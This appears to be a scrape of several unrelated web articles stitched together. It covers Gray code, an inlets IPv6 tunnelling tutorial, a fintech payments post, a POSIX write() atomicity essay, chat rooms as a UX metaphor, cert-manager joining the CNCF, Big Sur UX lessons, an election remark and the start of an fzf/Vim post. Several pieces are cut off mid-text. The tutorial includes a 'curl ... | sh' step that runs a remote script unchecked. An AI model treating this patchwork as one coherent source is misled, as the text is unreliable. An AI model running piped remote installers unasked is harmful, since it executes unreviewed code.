an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>

            <p>Many users have no IPv6 stack available to them where they run their services, whether at home or in the datacenter. Learn how you can use inlets to serve traffic to IPv6 users</p>

<h2 id="introduction">Introduction</h2>

<p><img src="https://inlets.dev/images/2020-11-ipv6-proxy/top.jpg" alt="Datacenter Networking"></p>

<p>This weekend an <a href="https://inlets.dev/">inlets PRO customer</a> reached out and asked for a new feature in inlets:</p>

<blockquote>
  <p>Please can you add IPv6 support?</p>
</blockquote>

<p>When I asked why, they told me that they were replacing their bespoke solution using Wireguard with inlets PRO. Everything worked as expected, but there was one missing piece. They were running an IPv6 proxy on the public VM so that users could access tunnelled services over IPv6.</p>

<p>After a little digging it transpired that because inlets and inlets PRO are written in <a href="https://golang.org/">Go</a>, that IPv6 was already part of the package and already working. No patches were required, so I wanted to put this post together and show you how you can start exposing traffic to users over IPv6.</p>

<p><img src="https://inlets.dev/images/2020-11-ipv6-proxy/conceptual.png" alt="inlets as an IPv6 Proxy"></p>

<blockquote>
  <p>Conceptual diagram: an inlets exit-server running on a public EC2 instance, using its IPv6 networking stack.</p>
</blockquote>

<h3 id="building-your-own-ipv6-proxy">Building your own IPv6 proxy</h3>

<p>You can use inlets or inlets PRO for this setup. The key is that your exit-server must be on an IaaS or VPS which has IPv6 enabled.</p>

<blockquote>
  <p><a href="https://metal.equinix.com/">Equinix Metal (Packet)</a> is the easiest option available and has IPv6 fully configured in the host OS out of the box.</p>
</blockquote>

<p>All versions of inlets come as static Go binaries, but it’s often easier to use some automation to install them on a cloud host, than to provision the host manually. <a href="https://github.com/inlets/inletsctl">inletsctl</a> sets up a host, generates an auth token and installs a systemd unit file.</p>

<blockquote>
  <p>Did you know? inlets can also be used with Kubernetes and both the client and server components can be used as Pods. The easiest way to get started is with the <a href="https://github.com/inlets/inlets-operator">inlets-operator</a>.</p>
</blockquote>

<p>Install inletsctl and download inlets to your client:</p>

<div><div><pre><code>curl <span>-SLs</span> https://inletsctl.inlets.dev | sh
<span>mv </span>inletsctl /usr/local/bin/

<span>sudo </span>inletsctl download

inlets version
</code></pre></div></div>

<blockquote>
  <p>The user told me that DigitalOcean also has an IPv6 capability, but you need to click to enable it in the dashboard, then within your Operating System. See also: <a href="https://www.digitalocean.com/docs/networking/ipv6/how-to/enable/">How to Enable IPv6 on Droplets</a></p>
</blockquote>

<p>Go to your Equinix Metal dashboard and create an API Key, call it “inletsctl” and give it read/write permissions. Save it to a file: <code>$HOME/api-token-packet.txt</code></p>

<p>Let’s run a server process for our IPv6 clients to connect to. Now if you’re using inlets OSS, then you need to use a HTTP server, but if you’re using inlets PRO you can use a TCP service like RDP or SSH.</p>

<p>Download <a href="https://github.com/openfaas/of-watchdog">the OpenFaaS watchdog</a> which is described as a “Reverse proxy for HTTP microservices and STDIO”</p>

<p>Simply put, it’s an HTTP server which acts a little like cgi-bin. It will run a local command-line process to execute whenever a request comes in. You can also use it with streaming workloads like ffmpeg or HTTP servers like Express.js.</p>

<div><div><pre><code>curl <span>-o</span> of-watchdog <span>-SL</span> https://github.com/openfaas/of-watchdog/releases/download/0.8.1/of-watchdog-darwin
<span>chmod</span> +x of-watchdog
</code></pre></div></div>

<p>You can also download for Windows and Linux here: <a href="https://github.com/openfaas/of-watchdog/releases/tag/0.8.1">watchdog binaries</a></p>

<p>Run <code>of-watchdog</code> so that every HTTP request that comes in triggers the <code>cal</code> command from bash.</p>

<div><div><pre><code><span>mode</span><span>=</span>streaming <span>fprocess</span><span>=</span>cal <span>port</span><span>=</span>8080 ./of-watchdog
</code></pre></div></div>

<p>Test out the server on your local computer:</p>

<div><div><pre><code>curl <span>-s</span> http://localhost:8080

   November 2020      
Su Mo Tu We Th Fr Sa

15 16 17 18 19 20 21  
22 23 24 25 26 27 28  
29 30
</code></pre></div></div>

<p>Now create an exit-server with inlets and point it at your SimpleHTTPServer:</p>

<div><div><pre><code><span># Set from your dashboard (under "Project settings")</span>
<span>export </span><span>PROJECT_ID</span><span>=</span><span>"66ae0069-7d03-4db5-9af1-6b14036e380a"</span>

inletsctl create <span>--provider</span> packet <span>\</span>
  <span>--access-token-file</span> <span>$HOME</span>/api-token-packet.txt <span>\</span>
  <span>--project-id</span> <span>$PROJECT_ID</span>
</code></pre></div></div>

<p>This command will create a <code>t1.small.x86</code> instance in the <em>ams1</em> region. You can override the region with <code>--region</code>.</p>

<p>You will see the IPv4 address printed out on the console along with connection info:</p>

<div><div><pre><code>Using provider: packet
Requesting host: confident-hamilton3 <span>in </span>ams1, from packet

</code></pre></div></div>

<p>To get the IPv6 address, log into your host over SSH, or open the Equinix Metal dashboard.</p>

<p><img src="https://inlets.dev/images/2020-11-ipv6-proxy/packet-dashboard.png" alt="curl test"></p>

<p>In my instance the address was: <code>2604:1380:2000:b700::5</code></p>

<h3 id="trying-it-out">Trying it out</h3>

<p>Connect your inlets client:</p>

<div><div><pre><code><span>export </span><span>UPSTREAM</span><span>=</span>http://127.0.0.1:8080
inlets client <span>--remote</span> <span>"ws://147.75.33.3:8080"</span> <span>\</span>

    <span>--upstream</span> <span>$UPSTREAM</span>
</code></pre></div></div>

<p>You can use <code>curl</code> to test the IPv6 endpoint, however if your local network does not support IPv6, you’ll need to create another host and run the command there. Most clouds and IaaS platforms support IPv6 out of the box.</p>

<p>Note the brackets around the address:</p>

<div><div><pre><code>curl <span>-v</span> http://[2604:1380:2000:b700::5]:80/
</code></pre></div></div>

<p><img src="https://inlets.dev/images/2020-11-ipv6-proxy/curl-test.png" alt="curl test"></p>

<p>See how to set up TLS for the IPv6 proxy using Caddy and this guide: <a href="https://blog.alexellis.io/expose-grafana-dashboards/">Expose your private Grafana dashboards with TLS</a>.</p>

<p>Try stopping the of-watchdog process and changing the “fprocess” command to something else like <code>wc</code>:</p>

<div><div><pre><code>curl <span>-s</span> http://[2604:1380:2000:b700::5]:80/ <span>\</span>
  <span>--data-binary</span> <span>"How many characters is this</span><span>\?</span><span>"</span>
       0       5      29
</code></pre></div></div>

<p>Try running <code>node</code> and a simple program to gather any input and print it back to the user:</p>

<p>Save <code>app.js</code>:</p>

<div><div><pre><code><span>"</span><span>use strict</span><span>"</span>

<span>let</span> <span>getStdin</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>get-stdin</span><span>'</span><span>);</span>

<span>let</span> <span>handle</span> <span>=</span> <span>(</span><span>req</span><span>)</span> <span>=&gt;</span> <span>{</span>
   <span>console</span><span>.</span><span>log</span><span>(</span><span>`Input was: "</span><span>${</span><span>req</span><span>}</span><span>"`</span><span>);</span>
<span>};</span>

<span>getStdin</span><span>().</span><span>then</span><span>(</span><span>val</span> <span>=&gt;</span> <span>{</span>
   <span>handle</span><span>(</span><span>val</span><span>);</span>
<span>}).</span><span>catch</span><span>(</span><span>e</span> <span>=&gt;</span> <span>{</span>
  <span>console</span><span>.</span><span>error</span><span>(</span><span>e</span><span>.</span><span>stack</span><span>);</span>
<span>});</span>
</code></pre></div></div>

<p>Install dependenices</p>
<div><div><pre><code>npm init <span>-y</span>
npm i get-stdin <span>--save</span>

<span>mode</span><span>=</span>streaming <span>fprocess</span><span>=</span><span>wc </span><span>port</span><span>=</span>8080 ./of-watchdog
</code></pre></div></div>

<p>Invoke it:</p>

<div><div><pre><code>curl <span>-s</span> http://[2604:1380:2000:b700::5]:80/ <span>--data-binary</span> <span>"There are many proxies, but this one is mine"</span>

Input was: <span>"There are many proxies, but this one is mine"</span>
</code></pre></div></div>

<p>The of-watchdog is just one component of OpenFaaS, and is designed to be used as part of a whole solution including metrics, auto-scaling, dashboards, and much more.

<h2 id="wrapping-up">Wrapping up</h2>

<p>In this tutorial we exposed a local API endpoint on a network with an IPv4 networking stack to public clients to access over IPv6. The IPv6 rollout is coming, but is slow and in the meantime solutions like inlets OSS and inlets PRO provide a way for us to serve traffic clients and to patch the gaps.</p>

<blockquote>
  <p>inlets can be used to create a self-hosted tunnels, but what you’re tunneling can also be kept private by binding to a local ethernet adapter. You can then access your services from the remote LAN, instead of over the Internet. A recent example of that is the post by Johan Siebens where he runs MySQL on-premises on a private network and WordPress on a cloud Kubernetes cluster. <a href="https://inlets.dev/blog/2020/11/06/hybrid-cloud-with-inlets.html">Read more here</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" id="item-5fb2d4ec1d80de49d2c39a6d"><div><div><div data-block-type="2" id="block-9c8e4bccc8ce9e0939f9"><div><p>Fintech has been on a tear over the last decade. Fintech’s global market cap is expected to reach $26.5 trillion in 2022 with a CAGR of 6%. The fintech market share across 48 fintech unicorns is now worth over US$187 billion (as of the first half of 2019). These are massive numbers and as our world changes rapidly around us, new financial tools are needed to help meet the needs of our new world. One area, in particular, we think has a massive change to drive the next generation of Unicorns is payments and related infrastructure, let’s get into why.</p><p>We all interact with payment technology every day, from swiping our card at the grocery store to ordering DoorDash or an Uber. In order for you and I to easily pay for these, there are payments infrastructure on the back-end enabling us to use anything from apple pay to our credit card to PayPal. We aren’t going to go into the mechanism of how these systems work because well…quite frankly it's complicated and maddening and I’m pretty sure I know 100% of it. But I do know one thing, there are massive amounts of data flowing through these systems, the perfect source of information to build SaaS services.</p><p>Payment systems sit in a very advantageous position in-between businesses and their customers. From this spot, they are able to see information about both sides, how businesses are pricing and bundling their products, and how and why consumers are buying them. From this vantage point, and with a little data digging, you can easily spot pain points in the process.</p><p>An example, take Stripe, one of the more popular payments and subscription management tools, and the top choice for e-commerce brands. Stripe noticed that merchants were struggling to manage cash between payments from customers and needing liquidity for growth. Using historical data from Stripe, they could generate an instant offer for a growth loan and then determine a percentage of daily sales that they would capture till the loan is repaid. It’s simple, effective and entirely based on data that Stripe readily has available. They found a customer pain-point and built a SaaS service to address it.</p><p>The future of SaaS is bright for fintech. We are excited to see how different payments platforms turn customer data into products and services that improve the lives of their existing customer base, solve pain-points and even uncover opportunities that no one even knew was there in the first place.</p><p>A few existing players we have our eye on: <a href="https://stripe.com/" target="_blank">Stripe</a>, <a href="https://paerpay.com/" target="_blank">Paerpay</a>, <a href="https://squareup.com/us/en" target="_blank">Square</a>, <a href="https://www.tangapp.org/" target="_blank">TANG</a>, <a href="https://www.etsy.com/" target="_blank">Etsy</a>, <a href="https://www.pinterest.com/">Pinterest</a>, <a href="https://edge.gg/" target="_blank">Edge</a>, and <a href="https://www.shopify.com/" target="_blank">Shopify</a>.</p></div></div></div></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>POSIX <code>write()</code> is not atomic in the way that you might like</h2>

	<p><small>November 16, 2020</small></p>
</div><div><p>I was recently reading Evan Jones' <a href="https://www.evanjones.ca/durability-filesystem.html">Durability: Linux File APIs</a>. In this quite
good article, I believe that Jones makes a misstep about what you can
assume about <code>write()</code> (both in POSIX and in practice). I'll start
with a quote from the article:</p>

<blockquote><p>The write system call is defined in the <a href="https://en.wikipedia.org/wiki/POSIX">IEEE POSIX standard</a> as attempting to write data to a
file descriptor. After it successfully returns, reads are required to
return the bytes that were written, even when read or written by other
processes or threads (<a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/write.html#tag_16_685_08">POSIX standard write(); Rationale</a>).
There is an addition note under <a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/V2_chap02.html#tag_15_09_07">Thread Interactions with Regular
File Operations</a>
that says "If two threads each call one of these functions, each call
shall either see all of the specified effects of the other call, or
none of them." This suggests that all file I/O must effectively hold a
lock.</p>

<p>Does that mean write is atomic? Technically, yes: future reads must
return the entire contents of the write, or none of it. [...]</p>
</blockquote>

<p>Unfortunately, that writes are atomic in general is not what POSIX
is saying and even if POSIX tried to say it, it's extremely likely
that no Unix system would actually comply and deliver fully atomic
writes. First off, POSIX's explicit statements about atomicity apply
only in two situations: when anything is writing to a pipe or a
FIFO, or when there are multiple threads in the same process all
performing operations.  What POSIX says about writes interleaved
with reads is much more limited, so let me quote it (emphasis mine):</p>

<blockquote><p>After a <code>write()</code> to a regular file <em>has successfully returned</em>:</p>
<ul><li>Any successful <code>read()</code> from each byte position in the file that was
modified by that write shall return the data specified by the <code>write()</code>
for that position until such byte positions are again modified.</li>
</ul>
</blockquote>

<p>This does not require any specific behavior for <code>read()</code>s on files
that are started by another process before the <code>write()</code> returns
(including ones started before the <code>write()</code> began). If you issue
such a <code>read()</code>, POSIX allows it to see none, some, or all of the
data from the <code>write()</code>. Such a <code>read()</code> is only (theoretically)
atomic if you issue it from another thread within the same process.
This definitely doesn't provide the usual atomicity property that
everyone sees either all of an operation or none of it, since a
cross process <code>read()</code> performed during the <code>write()</code> is allowed
to see partial results.  We would not call a SQL database that
allowed you to see partially complete transactions 'atomic', but
that is what POSIX allows for <code>write()</code> to files.</p>

<p>(It is also what real Unixes almost certainly provide in practice,
although I haven't tested this and there are many situations. For
instance, I wouldn't be surprised if aligned, page-sized writes (or
filesystem block sized ones) were atomic in practice on many Unixes.)</p>

<p>If we think about what it would take to implement atomic file writes
across processes, this should be unsurprising. Since <a href="https://utcc.utoronto.ca/~cks/space/blog/unix/WritesNotShortOften">Unix programs
don't expect short writes on files</a>, we can't
make the problem simpler by limiting how large a write we have to
make atomic and then capping <code>write()</code> to that size; people can ask
us to write megabytes or even gigabytes in a single <code>write()</code> call
and that would have to be atomic. This is too much data to be handled
by gathering it into an internal kernel buffer and then flipping
the visible state of that section of the file in one action.  Instead
this would likely require byte range locking, where <code>write()</code> and
<code>read()</code> lock against each other where their ranges overlap. This
is already a lot of locking activity, since every <code>write()</code> and every
<code>read()</code> would have to participate.</p>

<p>(You could optimize <code>read()</code> from a file that no one has open for
writing, but then it would still need to lock the file so that it
can't be opened for writing until the <code>read()</code> completes.)</p>

<p>But merely locking against <code>read()</code> is not good enough on modern
Unixes, because many programs actually read data by <code>mmap()</code>'ing
files. If you really want <code>write()</code> to be usefully atomic, you must
make these memory mapped reads lock against <code>write()</code> as well, which
requires relatively expensive page table manipulation. Worrying
about <code>mmap()</code> also exposes a related issue, which is that when
people read through memory mapping, <code>write()</code> isn't necessarily
atomic even at the level of individual pages of memory. A reader
using mapped memory may see a page that's half-way through the
kernel's <code>write()</code> copying bytes into it.</p>

<p>(This may happen even with <code>read()</code> and <code>write()</code>, since they may
both access the same page of data from the file in the kernel's
<a href="https://utcc.utoronto.ca/~cks/space/blog/unix/UnifiedBufferCache">buffer cache</a>, but it is probably easier to
lock things there.)</p>

<p>On top of the performance issues, there are fairness issues. If
<code>write()</code> is atomic against <code>read()</code>, a long <code>write()</code> or a long
<code>read()</code> can stall the other side for potentially significant
amounts of time. People do not enjoy slow and delayed <code>read()</code>
and <code>write()</code> operations. This also provides a handy way to DoS
writers of files that you can open for reading; simply set up to
<code>read()</code> the entire file in one go (or as few as possible) over
and over again.</p>

<p>However, much of these costs are because we want cross process
atomic <code>write()</code>s, which means that the kernel must be the one doing
the locking work. Cross thread atomic <code>write()</code> can be implemented
entirely at user level within a single process (provided that the
C library intercepts <code>read()</code> and <code>write()</code> operations when threading
is active). In a lot of cases you can get away with some sort of
simple whole file locking, although the database people will probably
not be happy with you. Fairness and stalls are also much less of an
issue within a single process, because the only person you're hurting
is yourself.</p>

<p>(Most programs do not <code>read()</code> and <code>write()</code> from the same file at
the same time in two threads.)</p>

<p>PS: Note that even writes to pipes and FIFOs are only atomic if
they are small enough; large writes explicitly don't have to be
atomic (and generally aren't on real Unixes). It would be rather
unusual for POSIX to specify limited size atomicity for pipes and
unlimited size atomicity for regular files.</p>

<p>PPS: I would be wary of assuming that any particular Unix actually
fully implemented atomic <code>read()</code> and <code>write()</code> between threads.
Perhaps I'm being cynical, but I would test it first; it seems like
the kind of picky POSIX requirement that people would cut out in
the name of simplicity and speed.</p>

<h2>Rooms As UX Metaphor</h2>
<p>I’ve been thinking a lot this year about Video Games, RPGs, Wargames and computing in general recently. Reading about how tightly they are bound up with one another and their shared origins. Some of this came through in the pre-pandemic days of <a href="https://www.thejaymo.net/2020/02/28/301-2008-role-for-a-thought-leadership-check/">Episode 20-08</a>. Where I was thinking aloud on how DnD, Stats and Simulation fucked up modernity. Some other bits of this will show up in the next <a href="https://www.thejaymo.net/Dimensino/">Dimensino</a> post on my blog about Permissive IPs too.</p>
<p>Anyhoos, This week I’ve been reading the <a href="http://pdf.textfiles.com/books/iftheorybook.pdf">IF Theory Reader</a> (PDF). Edited by K Jackson-Mead J. and R Wheeler. Published in 2011. It is a very niche book about the history, craft and theory of <a href="https://en.wikipedia.org/wiki/Interactive_fiction">Interactive Fiction</a>.&nbsp;It contains some fantastic essays.&nbsp;I recommend the book to anyone who has even a passing interest in Twine games or Interactive Fiction.&nbsp;</p>
<p>I also recently watched Jason Scott’s 2010 film GET LAMP: The Text Adventure Documentary.</p>
<figure></figure>
<p> It’s amazing. It also does a lot to show how D&amp;D, Interactive Fiction and Wargames influenced all virtual worlds.</p>
<p>I’m finding so much value in old books and writing on cyberspace right now. Because they remind me of the excitement and possibility of what the web could have been.&nbsp;</p>
<p>The web we lost.&nbsp;</p>
<p>I’ve just picked up the 1998 book. Hamlet on the <a href="https://mitpress.mit.edu/books/hamlet-holodeck-updated-edition">Holodeck : The Future of Narrative in Cyberspace</a> by Janet H Murray for 3.50 on ebay. And Finite and Infinite Games by James Carse on <a href="https://en.wikipedia.org/wiki/Paul_Czege">Paul Czege</a>‘s recommendation for 3 quid. Bargains. Can’t wait for them to arrive.</p>
<p>The first Interactive Fiction program <a href="https://en.wikipedia.org/wiki/Colossal_Cave_Adventure">Colossal&nbsp;Cave</a> was released in 1975. MUDs or Multi User Dungeons came soon after. By 1978–79, these games were heavy use on various university PLATO systems. They quickly increased in sophistication.&nbsp; 3D graphics, storytelling, user involvement, team play, and depth of objects and monsters in the dungeons etc.</p>
<p>The first chat system was used by the U.S. Government in 1971. Their first use came during President Nixon’s wage-price freeze under Project Delphi. The system was called EMISARI and allowed 10 regional offices to link together in real-time online chat.&nbsp; It was called the party line, after shared telephony circuits.</p>
<p>Its weird to think that real-time chat technology is 50 years old. Email is nearly 60. These technologies are so old, and yet so young. Former boomer colleagues have been moaning on LinkedIn, about using Discord or Slack for the first time all year.</p>
<p>Last month in <a href="https://www.thejaymo.net/2020/10/09/301-2040-abstract-objects/">Episode 20-40 on Abstract Objects</a> I spoke about metaphors and code environments, specifically chat rooms.</p>
<blockquote><p><em>“Chat ‘rooms’ aren’t really rooms in any sense. But I can see why the people that invented them gave them that name. As good a name as any to express and conceptualise there ‘room like’ qualities. Do you think of your group chats as being in kinds of rooms? “</em></p></blockquote>
<p>During my Interactive fiction binge this week. I found the essay <a href="http://www.brasslantern.org/writers/iftheory/roomasmetaphor.html">The Room as Metaphor in Interactive Fiction</a> by Nathan Jerpe. Which speaks to my question about them last month in October.&nbsp;&nbsp;</p>
<p>Rooms as metaphores in IF were in use right up to and including the early Point and Click Lucasarts games. Tim Schafer still uses this teminolgy when referring to locations in virtual worlds that contain puzzles.</p>
<p>Jerpe’s essay interrogates the metaphor of a room when thinking about virtual environments. Lets apply some of the terms Jerpe uses in discussing Interactive Fiction to chat rooms. As the metaphors should hold across environments.</p>
<p>The first heading in the essay is <strong>Tangibility</strong>. Rooms are tangible metaphors as rooms tend to be fully observable by a user within the structure of the code space. Structures that lend themselves well to modularity. Jerpe suggests that with a playwrights eye we might recompose activities that occur in rooms as scenes. Instead of moving from room to room or multiple locations, a room may host a series of scenes.</p>
<p>Activity in group chats generally comes in bursts. If we consider these fluries of activity as scenes, what sort of UX could be developed in chat apps or even zoom rooms with the ide of scenes?</p>
<p>Rooms also have <strong>Spatial vs. Temporal</strong> qualities. Spatial in that activities occur inside of rooms woth clear boundries.&nbsp;</p>
<p>What if chat room UX moved, shifted, or came from nowhere, only to later disappear altogether? A group of friends in a group chat navigating a shifting metaphor.&nbsp;</p>
<p>I’ve always wanted to be able to start sub chats inside the verticality of a chat feed. Like starting a thread in a forum. Little bubbles of sub chats below the surface of the stream.</p>
<p>Another feature of rooms is <strong>Crowdedness</strong>. If you are in as many discords as I am, you’ll be famililer with dropping by a busy channel. Contributing for a bit and then marking everything else as read. Busy chats do have a sense of Crowdedness.&nbsp;</p>
<p>A nother feature of Crowdedness is that an individual’s actions are typically visible for others in the room to witness. I wonder how the sub chats UX I mention would change the experience of a Discord. Or telegram. Less channels probably. Strange topologies.</p>
<p>In the conclusion, in the context of interactive fiction, Jepe notes. Individuals operating inside a room metaphor are locked into the role of <em>the protagonist</em>. But notes this is worth reconsidering.&nbsp;</p>
<p>What would it mean to participate in a group chat where each individual does not consider themselves to be the protagonist or central agent?</p>
<p>Stange new UX’s FTW.</p>
<hr>
<p>The above is the original script I wrote for the episode. It may differ from what ended up in audio due to time constraints.</p>

            <p>We are excited to announce that our donation of the <a href="https://cert-manager.io/">cert-manager</a> project to the <a href="https://www.cncf.io/">Cloud Native Computing Foundation® (CNCF®)</a> <a href="https://www.cncf.io/sandbox-projects/">“Sandbox”</a> has been accepted.</p>
<p>cert-manager automates the management of X.509
machine identities within Kubernetes and OpenShift and has become one of the leading community projects
in the cloud-native ecosystem. The project is now used by companies all across the world and in all sorts of industries, including government departments, large financial institutions, car manufacturers, and retail stores.</p>
<p>It’s exciting to see cert-manager join the CNCF Sandbox. It’s been several
years in the making to <a href="https://blog.jetstack.io/blog/cert-manager-1.0/">get to 1.0</a> and it’s been a pleasure for Jetstack to have supported the team behind
it, working closely with over 260 contributors and many end-users to get it to where it is today. It’s a foundational add-on to many Kubernetes and OpenShift clusters and the project
will benefit being part of the CNCF and its ecosystem that is enabling modern and open cloud native systems for users across the globe.</p>
<h2 id="why-we-are-donating-cert-manager-to-the-cncf">Why we are donating cert-manager to the CNCF</h2>
<p>Cert-manager is widely used; it has a large user base and following, and projects across the ecosystem integrate with it. Jetstack, with the support of our parent company <a href="https://www.venafi.com/">Venafi</a>, believes such a foundational component belongs in the CNCF, with its vendor-neutrality, alongside many of the projects that rely on it and would benefit from a close collaboration. Being part of the CNCF will enable the project to attract a diverse contributor base and help to promote partnership and cooperation with many ecosystem projects, including those in the CNCF.</p>
<h2 id="what-is-cert-manager-and-how-is-it-used">What is cert-manager and how is it used?</h2>
<p><a href="https://cert-manager.io/">cert-manager</a> enables developers to easily request machine identities to secure
applications. Certificates can be signed by public and private certificate
authorities such as Let’s Encrypt and Venafi, and cert-manager handles the
automation of the certificate lifecycle. This means developers can move fast
and stay secure, while platform and security teams have control and visibility.
The popularity of cert manager within the Kubernetes community and its utility
in a wide range of projects makes cert-manager an ideal project for the CNCF.</p>
<p>The most common use case for cert-manager is requesting TLS signed certificates to <a href="https://cert-manager.io/docs/usage/ingress/">secure Ingress resources</a>. It can also be used programmatically by Kubernetes-native applications, as well as via the CSI driver to provide certificates on disk for the likes of intra-pod mTLS and more legacy applictions. Read more about how to <a href="https://cert-manager.io/docs/installation/">get started</a> and <a href="https://cert-manager.io/docs/usage/">usage</a> at the <a href="https://cert-manager.io/docs">cert-manager documentation</a>.</p>

<p>A <em>huge</em> thank you to all that have been involved in getting
cert-manager to where it is today! A special thanks to <a href="https://twitter.com/JamesMunnelly">James Munnelly</a>, who had the foresight to build and architect the project and
grow the community to where it is today, including a team of Jetstack engineers and 260+ contributors!</p>
<h2 id="whats-coming-in-the-future">What’s coming in the future</h2>
<p>As part of the CNCF, we’re really looking forward to working with projects in the ecosystem
including continued collaboration with the Kubernetes project (e.g. Kubernetes CSR API), other projects such as <a href="https://openservicemesh.io/">OpenServiceMesh</a>, as well as new and additional efforts where we can be complementary (e.g. SPIFFE/Spire).</p>
<p>The project <a href="https://github.com/jetstack/cert-manager/blob/master/ROADMAP.md">roadmap</a> describes the major themes for the future, including supporting a broader set of use cases (including service mesh), support of upstream APIs, policy, extensbility through external issuers, PKI lifecycle management and more. If any features pique your interest, let us know what you think and feel free to join us and get involved!</p>
<h2 id="how-to-get-involved">How to get involved</h2>
<p>If you would like to be involved in the development of the project within the
CNCF then sign up for the <a href="https://groups.google.com/g/cert-manager-dev">mailing
list</a> which we use to send out
calendar invites. Once you have joined, you’ll receive invites to our bi-weekly
development meeting (held every other Wednesday at 5pm UK time).</p>
<p>The #cert-manager channel on the <a href="https://slack.k8s.io/">Kubernetes Slack</a> is

November 17, 2020 | https://learnuxd.io/posts/ux-lessons-from-big-sur | <a href="https://web.archive.org/web/*/https://learnuxd.io/posts/ux-lessons-from-big-sur">archive.org</a>

    <img src="https://learnuxd.io/img/posts/big-sur/cover.png" alt="UX Lessons from Big Sur">
</figure>

<p>The largest tech company in the world just launched new software.</p>

<p>There are problems with Apple’s Big Sur, but let’s look at a few UX decisions they (mostly) got right.</p>

<h2 id="user-first">User-first</h2>

<p>Emphasis on the UI was reduced in order to keep the focus on the user’s content. Buttons and controls appear when needed and recede when they’re not. Border and bezels have been softened or removed.</p>

<p><strong>The interface is there to serve the user<span>—</span>it shouldn’t draw attention to itself. Remove visual complexity &amp; increase the signal to noise ratio.</strong></p>

<figure>
    <img src="https://learnuxd.io/img/posts/big-sur/user-first.png" alt="User-first">
</figure>

<h2 id="privacy--transparency">Privacy &amp; transparency</h2>

<p>Tracking prevention and transparency have been added to Safari. Inspired by food nutrition labels, new privacy information on the App Store lets you see a summary of the privacy practices of each app before you download it.</p>

<p><strong>Put privacy and transparency first. It’s in the best interest of your user.</strong></p>

<figure>
    <img src="https://learnuxd.io/img/posts/big-sur/privacy-transparency.png" alt="Privacy and transparency">
</figure>

<h2 id="drill-down-on-key-workflows">Drill down on key workflows</h2>

<p>Apple clearly had a goal to improve the Messages app. There are now pinned conversations, better search, inline replies, mentions, and the ability to find GIFs. They know Messages are an important part of their platform.</p>

<p><strong>Invest time and effort in improving key tasks &amp; flows in your product. It’ll pay off in the end.</strong></p>

<figure>
    <img src="https://learnuxd.io/img/posts/big-sur/key-tasks.png" alt="Drill down on key workflows">
</figure>

<h2 id="uniformity-across-services">Uniformity across services</h2>

<p>The Control Center and Notification Center changes are meant to create consistency through the ecosystem. There’s also new unified line of symbols. Some of the visual changes, though, like the new app icons, don’t match up with iOS 14; hopefully they’ll fix that.</p>

<p><strong>Maintain consistency and adhere to your own standards. It reduces cognitive load, makes the UI learnable, and gives a feeling of familiarity and confidence.</strong></p>

<figure>
    <img src="https://learnuxd.io/img/posts/big-sur/uniformity.png" alt="Uniformity across services">

<h2 id="system-status-visibility">System status visibility</h2>

<p>Multiple updates and standardizations were made to top-level UI’s, including the Control Center, widgets, Spotlight, and the Notification Center. These changes make system status clear, easy to find, and customizable.</p>

<p><strong>Quick access to general system controls and information makes an interface feel reliable and predictable, and builds trust.</strong></p>

<h2 id="stick-with-whats-familiar">Stick with what’s familiar</h2>

<p>When redesigning dock icons, Apple consciously tried to retain the personality from the original. There are lots of new UI sounds as well, which were literally built on top of snippets of the originals so that they sounded familiar.</p>

<p><strong>When doing a redesign, remember Familiarity Bias: people prefer familiar experiences. It’s best to build off what you have rather than make an entirely new experience.</strong></p>

<h2 id="clear-visual-feedback">Clear visual feedback</h2>

<p>The Dock and Menu Bar have a new interface that allows you to customize where controls show up. The method they use of visually showing the user exactly what will happen is not only satisfying, it’s a very effective form of communication.</p>

<p><strong>Clearly communicate the consequences of decisions, preferably visually.</strong></p>

<p>What do you think of Big Sur so far? What could they have done better?</p>

              <p>There seems to be a widely held opinion that this election was close.</p>
<p>I think it’s due to the fact that several states, like Georgia, Arizona, and Wisconsin, were indeed decided by less than 1% of votes cast. But when looking at the aggregate outcome, it’s hard to characterize the result as anything but historically decisive.</p>
<p>This article from The Nation notes that, despite Trump’s claim to have “WON THIS ELECTION, BY A LOT!", you’d have to go back <em>88 years</em> to find an incumbent loss by this margin - Biden won a higher precentage of the vote than any incumbent challenger since FDR defeated Herbert Hoover in 1932.</p>

The president may deny reality, but he cannot change the fact that he is now losing the popular vote and the Electoral College by momentous margins.

<p>If you never heard of <a href="https://github.com/junegunn/fzf">fzf</a>, it is a very
handy general-purpose command-line fuzzy finder. Besides command-line, it is
also a popular Vim plugin. If you’re wondering, a fuzzy finder is a tool that
helps you find what you’re looking for without needing to write the full name.</p>
<p>As a Vim user, I am always obsessed with doing a thing in the fewer keystrokes
as possible. Having the ability to open a file in Vim quickly is super useful to
me, and you will see why soon.</p>
<p>But, did you know that this fuzzy finder - fzf, can do a lot more than you
thought? Oh yeah, the fuzzy search is just the tip of the iceberg here.
It is like wine; the more you leave it on your computer, the more flavor and
sweetness it accumulates from that command-line. Let’s dive in and find out how
you can increase your productivity with fzf inside Vim.</p>
<h2 id="starting-off"><a href="#starting-off" aria-label="starting off permalink"></a>Starting off</h2>
<p>To be able to do the things I am doing in this blog post, you will need a couple of
plugins. If you’re not using <a href="https://github.com/junegunn/vim-plug">vim-plug</a>
for installing other Vim plugins, then you are missing out. Go ahead and set
